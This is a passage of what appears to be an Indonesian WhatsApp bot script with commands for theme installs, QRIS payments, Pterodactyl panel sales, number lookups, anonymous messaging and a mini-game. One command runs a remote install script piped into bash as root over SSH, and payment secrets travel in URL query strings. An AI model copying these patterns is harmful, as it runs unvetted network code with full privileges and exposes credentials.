        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', async () => {
                Reply("Memproses instalasi *tema Nightcore* Pterodactyl. Tunggu 1-10 menit hingga selesai...");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async () => {
                        await Reply("Berhasil menginstal *tema Nightcore* Pterodactyl 🔥");
                        ress.end();
                    }).on('data', (data) => {
                        console.log(data.toString());
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                Reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);
            
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "deposit": {
    if (!q) return Reply(`*Example : ${prefix+command} 50000*`);

    let amount = parseInt(q.replace(/[^0-9]/g, "")); // Hanya angka untuk jumlah deposit
    if (isNaN(amount) || amount < 1000) {
        return Reply(`*Jumlah minimal deposit adalah Rp1000.*\n\n_Example: ${prefix+command} 50000_`);
    }

    const UrlQr = global.qrisOrderKuota;

    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

    const teksPembayaran = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Deposit
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`;

    let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Deposit`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await TamaMods.sendMessage(db.users[m.sender].deposit.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await TamaMods.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].deposit.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Tambahkan saldo ke akun pengguna
            if (!db.users[m.sender].saldo) db.users[m.sender].saldo = 0;
            db.users[m.sender].saldo += parseInt(req);

            await TamaMods.sendMessage(db.users[m.sender].deposit.chat, { text: "Pembayaran berhasil! Saldo telah ditambahkan ke akun Anda." }, { quoted: db.users[m.sender].deposit.msg });
            await Reply(`Saldo sebesar Rp${await toIDR(req)} telah ditambahkan ke akun Anda ✅`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "buypanel": {
if (m.isGroup) return Reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp11.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${global.botname2}\nAuto Order Panel`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return Reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)

const teks3 = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Panel`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_20",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Anda 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await TamaMods.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: pantek})
await fs.unlinkSync("./akunpanel.txt")
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
        case 'cekinfo': {
        if (!isCreator) return Reply(mess.owner)
    if (!args[0]) return Reply('Masukkan nomor yang ingin dicek! Contoh: cekinfo 628xx');

    let nomor = args[0].replace(/[^0-9]/g, ''); // Membersihkan input
    if (!nomor) return Reply('Nomor tidak valid!');

    // Cek nomor di WhatsApp
    let cek = await TamaMods.onWhatsApp(nomor + '@s.whatsapp.net');
    if (cek.length == 0) {
        return Reply(`Nomor ${nomor} tidak terdaftar di WhatsApp.`);
    }

    let { jid, exists, notify, name } = cek[0]; // Ambil informasi akun nomor
    if (!exists) return Reply(`Nomor ${nomor} tidak memiliki akun WhatsApp.`);

    try {
        // Informasi akun
        let infoFoto = await TamaMods.profilePictureUrl(jid, 'image').catch(() => 'https://i.ibb.co/DWLv1V7/default-avatar.png');
        let allGroups = await TamaMods.groupFetchAllParticipating(); // Semua grup bot
        let userGroups = Object.values(allGroups).filter(g => g.participants.includes(jid)); // Grup yang diikuti nomor
        let jumlahGrup = userGroups.length;

        // Tambahkan fallback untuk kontak & lokasi
        let jumlahKontak = 'Tidak diketahui'; // Kontak hanya bisa diambil jika tersinkron dengan bot
        let lokasi = 'Tidak tersedia';
        let versiWhatsApp = 'Versi WhatsApp: 2.23.21.1'; // Lokasi hanya bisa diperoleh jika berbagi lokasi aktif

        // Mengirim hasil
        Reply(`*Informasi Nomor WhatsApp*\n\n` +
            `*Nomor:* ${nomor}\n` +
            `*Nama Akun:* ${name || 'Tidak tersedia'}\n` +  // Nama akun diambil dari nomor
            `*Nama Notifikasi:* ${notify || 'Tidak diketahui'}\n` +
            `*JID:* ${jid}\n\n` +
            `*Foto Profil:* ${infoFoto}\n` +
            `*Jumlah Grup:* ${jumlahGrup}\n` +
            `*Jumlah Kontak:* ${jumlahKontak}\n` +
            `*Versi WhatsApp:* ${versiWhatsApp}\n` +
            `*Lokasi:* ${lokasi}`);
    } catch (err) {
        console.error(err);
        Reply('Gagal mengambil informasi akun. Pastikan nomor valid atau coba lagi nanti.');
    }
}
break;
        
 

case "thanksto": case "tqto": {
await Reply(`*Thanks To The Supporter Of This Script :*

- TamaMods
- Alwaysaqioo
- Tama Ryuichi
- Kaizi
- Kiraa
- DilxzXD`)
}
break
            
case 'confess': case 'confes': case 'menfes': case 'menfess':{
TamaMods.menfes = TamaMods.menfes ? TamaMods.menfes : {}
roof = Object.values(TamaMods.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return Reply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return Reply('Fitur Khusus Di private chat!')
if (!text) return Reply(`Kirim Perintah ${prefix+command} nama|nomor|pesan\n\nContoh :\n${prefix+command} ${m.pushName}|628xxx|Pesan nya\n`)
if (!text.includes('|')) return Reply(`Kirim Perintah ${prefix+command} nama|nomor|pesan\n\nContoh :\n${prefix+command} ${m.pushName}|628xx|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return Reply(`Kirim Perintah ${prefix+command} nama|nomor|pesan\n\nContoh :\n${prefix+command} ${m.pushName}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return Reply(`Kirim Perintah ${prefix+command} nama|nomor|pesan\n\nContoh :\n${prefix+command} ${m.pushName}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
TamaMods.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await TamaMods.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
Reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
//------(Batas Case)------//
case 'balasmenfess': {
    TamaMods.menfes = TamaMods.menfes ?? {};
    const roof = Object.values(TamaMods.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return Reply("Belum ada sesi menfess");

    const room = Object.values(TamaMods.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
    if (!room) return Reply("Tidak ada sesi menfess yang sedang menunggu");

    const other = [room.a, room.b].find(user => user !== m.sender);
    room.b = m.sender;
    room.state = 'CHATTING';
    TamaMods.menfes[room.id] = { ...room };

    await TamaMods.sendMessage(other, {
        text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini._\n\n*NOTE:* Ketik .stopmenfess untuk berhenti.`,
        mentions: [m.sender],
    });
    Reply("Menfess diterima, sekarang kamu bisa chat!");
    Reply("Silakan balas pesan langsung di chat ini. Semua pesan akan diteruskan.");
}
break;

case 'tolakmenfess': {
    TamaMods.menfes = TamaMods.menfes ?? {};
    const roof = Object.values(TamaMods.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return Reply("Belum ada sesi menfess");

    const other = [roof.a, roof.b].find(user => user !== m.sender);
    await TamaMods.sendMessage(other, {
        text: `_Maaf, @${m.sender.split("@")[0]} menolak menfess kamu._`,
        mentions: [m.sender],
    });
    Reply("Menfess berhasil ditolak.");
    delete TamaMods.menfes[roof.id];
}
break;

case 'stopmenfess': {
    TamaMods.menfes = TamaMods.menfes ?? {};
    const find = Object.values(TamaMods.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!find) return Reply("Belum ada sesi menfess");

    const to = find.a === m.sender ? find.b : find.a;
    await TamaMods.sendMessage(to, {
        text: "_Sesi menfess ini telah dihentikan._",
        mentions: [m.sender],
    });
    Reply("Sesi menfess dihentikan.");
    delete TamaMods.menfes[find.id];
}
break;

case "cekstatus": case "cek-status": {
if (!isCreator) return Reply(mess.owner)
let t = text.split(",");
if (t.length < 3) return Reply(`Contoh:\nid,reff pesanan,id produk`)
let id = t[0]
let reff = t[1]
let pr = t[2]
const proses = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.IdMerchant}&pin=${global.pinorkut}&password=${global.pworkut}&product=${pr}&dest=${id}&refID=${reff}`);
Reply(proses);
}
break
//------(Batas Case)------//
case "ceksaldo-orkut": {
if (!isCreator) return Reply(mess.owner);
const url = `https://h2h.okeconnect.com/trx/balance?memberID=${global.IdMerchant}&pin=${global.pinorkut}&password=${global.pworkut}`
const res = await fetchJson(url);
const bejirrsultan = `
Berikut Adalah Saldo Orkut Anda ❗

 *• Merchant :* ${global.IdMerchant}
 *• Balance :* ${res}
`
Reply(bejirrsultan)
}
break;

case "cekmutasi": case "mutasi": {
if (!isCreator) return Reply(mess.owner);
try {
const url = `https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`;
const response = await axios.get(url);

const transaksi = response.data || {};
if (transaksi.date) {
const tanggal = transaksi.date || "Tidak tersedia";
const nominal = transaksi.amount || "Tidak tersedia";
const jenis = transaksi.type || "Tidak tersedia";
const qris = transaksi.qris || "Tidak tersedia";
const namaBrand = transaksi.brand_name || "Tidak tersedia";
const issuerRef = transaksi.issuer_reff || "Tidak tersedia";
const buyerRef = transaksi.buyer_reff || "Tidak tersedia";
const saldo = transaksi.balance || "Tidak tersedia";

const caption = `
*▧ MUTASI TRANSAKSI*

 *• Tanggal :* ${tanggal}
 *• Nominal :* ${nominal}
 *• Jenis :* ${jenis}
 *• QRIS :* ${qris}
 *• Nama Brand :* ${namaBrand}
 *• Issue Reff :* ${issuerRef}
 *• Buyer Reff :* ${buyerRef}
 *• Balance :* ${saldo}
 
Berikut ini adalah hasil dari transaksi terakhir.`

Reply(caption);
} else {
console.error("Response tidak valid:", transaksi);
Reply("Gagal mendapatkan informasi transaksi. Coba lagi nanti.");
}
} catch (error) {
console.error("Error saat mengecek mutasi transaksi:", error.message);
Reply("Terjadi kesalahan saat mengecek mutasi transaksi. Silakan coba lagi.");
}
}
break;

case 'kerja':
case 'bekerja': {
  if (!m.isGroup) return Reply(mess.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let type = (args[0] || '').toLowerCase()
    let users = global.db.users[m.sender]
    let time = users.lastkerja + 30000
    let __timers = (new Date - users.lastkerja)
    let _timers = (1000 - __timers)
    let timers = clockString(_timers)

    let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]

    let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
    let dagangan = daganga[Math.floor(Math.random() * daganga.length)]
    
    let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
    let pasien = pasie[Math.floor(Math.random() * pasie.length)]

    let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
    let panen = pane[Math.floor(Math.random() * pane.length)]

    let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
    let bengkel = bengke[Math.floor(Math.random() * bengke.length)]

    let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
    let rumah = ruma[Math.floor(Math.random() * ruma.length)]

    if (/kerja/i.test(command)) {
        switch (type) {
            case 'ojek':
if (new Date - users.lastkerja < 300000) return Reply(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilojek * 1
	              users.lastparming = new Date * 1
Reply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} ('money')*`)
break
            case 'pedagang':
if (new Date - users.lastkerja < 300000) return Reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildagang = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildagang * 1
	              users.lastparming = new Date * 1
Reply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} ('money')*`)
break
            case 'dokter':
if (new Date - users.lastkerja < 300000) return Reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildokter = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildokter * 1
	              users.lastparming = new Date * 1
Reply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* ('money')`)
break
            case 'petani':
if (new Date - users.lastkerja < 300000) return Reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasiltani * 1
	              users.lastparming = new Date * 1
Reply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} ('money')*`)
break
            case 'montir':
if (new Date - users.lastkerja < 300000) return Reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilmontir = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilmontir * 1
	              users.lastparming = new Date * 1
Reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* ('money')`)
break
            case 'kuli':
if (new Date - users.lastkerja < 300000) return Reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilkuli * 1
	              users.lastparming = new Date * 1
Reply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ('money')*`)
break
            default:
return Reply(`_*Pilih Pekerjaan Yang Kamu Inginkan*_\n\n_• Kuli_ \n_• Montir_ \n_• Petani_ \n_• Dokter_ \n_• Pedagang_ \n_• Ojek_ \n\nContoh Penggunaan :\nkerja Kuli`)
        }
    }
}
break
//------(Batas Case)------//
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case 'acumalaka':
case 'reza-kecap':
case 'farhan-kebab':
case 'omaga':
case 'kamu-nanya':
case 'anjay':
case 'siuu':
